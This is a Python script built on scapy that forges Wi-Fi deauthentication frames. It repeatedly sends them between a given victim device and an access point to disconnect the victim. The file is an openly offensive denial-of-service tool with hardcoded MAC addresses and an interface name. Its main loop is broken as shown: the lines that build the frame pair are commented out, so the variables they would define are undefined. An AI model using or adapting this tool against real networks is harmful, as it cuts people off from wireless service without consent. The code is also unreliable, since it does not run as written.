#!/usr/bin/env python3
from scapy.all import *
from scapy.layers.dot11 import RadioTap, Dot11Deauth, Dot11Disas, Dot11FCS, Dot11
from time import sleep

BROADCAST = 'ff:ff:ff:ff:ff:ff'
AP_MAC = '18:31:bf:e1:c9:b4'
VICTIM_MAC = "A0:C9:A0:9D:AA:B9"

INTERFACE = "wlx4401bb9182b7"

DEAUTH_REASON = 0x03
# 1314 microseconds. Arbitrary? I think I stole this value from airodump captures.
SEND_DURATION = 1314
DEAUTH_SUBTYPE = 12

# Can be either DOT11Deauth or Dot11Disas
DOT11_DISCONNECT_TYPE = Dot11Deauth


def new_sequence_control(frag: int, seq: int) -> int:
    return (seq << 4) + frag


def new_deauth(dst_mac: str, src_mac: str, ap_mac: str, seq_num: int, reason: int) -> Dot11Deauth:
    sc = new_sequence_control(0, seq_num)
    # TODO: Why is the RadioTap header with those present flags necessary?
    return RadioTap(present="Rate+TXFlags") / \
           Dot11(ID=SEND_DURATION, addr1=dst_mac, addr2=src_mac, addr3=ap_mac, SC=sc) / \
           DOT11_DISCONNECT_TYPE(reason=reason)


def new_deauth_pair(victim_mac: str, ap_mac: str, starting_seq_n: int) -> tuple[Dot11Deauth, Dot11Deauth]:
    return (new_deauth(victim_mac, ap_mac, ap_mac, starting_seq_n, DEAUTH_REASON),
            new_deauth(ap_mac, victim_mac, ap_mac, starting_seq_n + 1, DEAUTH_REASON))


def main():  # Wrap in try
    if len(sys.argv) == 3:
        _, victim_mac, ap_mac = sys.argv
        for seq in range(0, 1000, 2):
            #one, two = new_deauth_pair(victim_mac, ap_mac, seq)
            #one = new_deauth(victim_mac, ap_mac, ap_mac, 0, DEAUTH_REASON)
            sendp([one, two], iface=INTERFACE, verbose=False)
            print(f"{seq}/1000")

            sleep(0.1)
    else:
        print("Usage: ./deauth victim_mac ap_mac")


if __name__ == "__main__":
    main()



